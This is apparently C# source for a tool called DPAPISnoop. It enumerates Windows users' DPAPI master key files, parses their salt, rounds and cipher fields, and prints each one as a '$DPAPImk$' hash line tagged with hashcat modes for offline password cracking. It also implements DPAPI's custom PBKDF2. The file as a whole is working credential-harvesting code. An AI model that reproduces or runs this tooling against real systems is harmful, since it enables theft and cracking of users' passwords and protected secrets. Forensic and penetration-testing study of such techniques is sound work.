using System;
using System.IO;
using System.Linq;
using System.Security.Cryptography;

using static DPAPISnoop.Helpers;

namespace DPAPISnoop
{
    internal static class Dpapi
    {
        internal static byte[] GetMasterKey(byte[] masterKeyBytes)
        {
            var offset = 96;
            var masterKeyLen = BitConverter.ToInt64(masterKeyBytes, offset);
            offset += 4 * 8;

            var masterKeySubBytes = new byte[masterKeyLen];
            Array.Copy(masterKeyBytes, offset, masterKeySubBytes, 0, masterKeyLen);
            return masterKeySubBytes;
        }

        internal static void DumpMasterKeyHash(byte[] masterKeyBytes, string sid, string username, bool isDomain, bool pre1607)
        {
            var mkBytes = GetMasterKey(masterKeyBytes);

            // version(4) salt(16) rounds(4) hashAlgo(4) cryptAlgo(4) encData
            var salt = new byte[16];
            Array.Copy(mkBytes, 4, salt, 0, 16);
            var iv = ByteArrayToString(salt);

            var offset = 20;
            var rounds = BitConverter.ToInt32(mkBytes, offset); offset += 4;
            var algHash = BitConverter.ToInt32(mkBytes, offset); offset += 4;
            var algCrypt = BitConverter.ToInt32(mkBytes, offset); offset += 4;

            var encData = new byte[mkBytes.Length - offset];
            Array.Copy(mkBytes, offset, encData, 0, encData.Length);
            var cipher = ByteArrayToString(encData);

            var version = 0;
            var hmacAlgo = "";
            var cipherAlgo = "";

            // algHash/algCrypt constants
            // CALG_HMAC    = 0x8009 = 32777  (HMAC-SHA1 as PRF)
            // CALG_SHA1    = 0x8004 = 32772
            // CALG_SHA_512 = 0x800E = 32782
            // CALG_3DES    = 0x6603 = 26115
            // CALG_AES_256 = 0x6610 = 26128
            switch (algCrypt)
            {
                case 26115 when algHash == 32777:
                    version = 1;
                    cipherAlgo = "des3";
                    hmacAlgo = "sha1";
                    break;
                case 26128 when algHash == 32782:
                    version = 2;
                    cipherAlgo = "aes256";
                    hmacAlgo = "sha512";
                    break;
                case 26128 when algHash == 32772:
                    // AES-256 + SHA-1 (uncommon but valid on some builds)
                    version = 2;
                    cipherAlgo = "aes256";
                    hmacAlgo = "sha1";
                    break;
                default:
                    Console.Error.WriteLine($"[!] Unknown algorithm pair: cryptAlgo=0x{algCrypt:x4} hashAlgo=0x{algHash:x4}");
                    return;
            }

            // Context field for $DPAPImk$:
            // 1 = local user
            // 2 = domain user pre-1607  (hashcat 15300 / 15900)
            // 3 = domain user post-1607 (hashcat 15310 / 15910)
            int context = isDomain ? (pre1607 ? 2 : 3) : 1;
            Console.WriteLine($"{username}:$DPAPImk${version}*{context}*{sid}*{cipherAlgo}*{hmacAlgo}*{rounds}*{iv}*{cipher.Length}*{cipher}");
        }

        internal static void DumpUserMasterKeys(string userDpapiBasePath, string username, bool pre1607)
        {
            string[] sidDirs;
            try
            {
                sidDirs = Directory.GetDirectories(userDpapiBasePath);
            }
            catch (UnauthorizedAccessException)
            {
                Console.Error.WriteLine($"[!] Access denied reading DPAPI directory for {username}");
                return;
            }

            foreach (var directory in sidDirs)
            {
                var sid = directory.TrimEnd('\\').Split(Path.DirectorySeparatorChar).Last();
                var isDomain = false;
                var directoryInfo = new DirectoryInfo(directory);

                FileInfo[] files;
                try { files = directoryInfo.GetFiles(); }
                catch (UnauthorizedAccessException)
                {
                    Console.Error.WriteLine($"[!] Access denied reading masterkeys for {username} SID={sid}");
                    continue;
                }

                if (files.Any(x => x.Name.StartsWith("BK-")))
                    isDomain = true;

                foreach (var file in files.OrderByDescending(f => f.LastWriteTime))
                {
                    if (file.Name.StartsWith("Preferred") || file.Name.StartsWith("BK") ||
                        !Guid.TryParse(file.Name, out _))
                        continue;

                    var masterKeyBytes = File.ReadAllBytes(file.FullName);
                    try
                    {
                        DumpMasterKeyHash(masterKeyBytes, sid, username, isDomain, pre1607);
                        break;
                    }
                    catch (Exception e)
                    {
                        Console.Error.WriteLine("[!] Error triaging {0} : {1}", file.FullName, e.Message);
                    }
                }
            }
        }

        // Non-standard DPAPI PBKDF2.
        // 0x8009/0x8004 = SHA-1; 0x800e = SHA-512.
        internal static byte[] DpapiPbkdf2(int hashAlgo, byte[] password, byte[] salt, int rounds, int dkLen)
        {
            if (hashAlgo != 0x8004 && hashAlgo != 0x8009 && hashAlgo != 0x800e)
                throw new ArgumentException($"Unsupported hashAlgo 0x{hashAlgo:x4}");

            bool useSha512 = hashAlgo == 0x800e;
            int hashLen = useSha512 ? 64 : 20;
            int nBlocks = (dkLen + hashLen - 1) / hashLen;
            var output = new byte[nBlocks * hashLen];

            for (int blockNum = 1; blockNum <= nBlocks; blockNum++)
            {
                var blockInput = new byte[salt.Length + 4];
                Array.Copy(salt, blockInput, salt.Length);
                blockInput[salt.Length] = (byte)(blockNum >> 24);
                blockInput[salt.Length + 1] = (byte)(blockNum >> 16);
                blockInput[salt.Length + 2] = (byte)(blockNum >> 8);
                blockInput[salt.Length + 3] = (byte)blockNum;

                byte[] dgst, xorAcc;
                using (HMAC hmac = useSha512 ? (HMAC)new HMACSHA512(password) : new HMACSHA1(password))
                {
                    dgst = hmac.ComputeHash(blockInput);
                    xorAcc = (byte[])dgst.Clone();
                    for (int i = 1; i < rounds; i++)
                    {
                        dgst = hmac.ComputeHash(xorAcc);
                        for (int j = 0; j < hashLen; j++)
                            xorAcc[j] ^= dgst[j];
                    }
                }

                Array.Copy(xorAcc, 0, output, (blockNum - 1) * hashLen, hashLen);
            }

            var result = new byte[dkLen];
            Array.Copy(output, result, dkLen);
            return result;
        }
    }
}
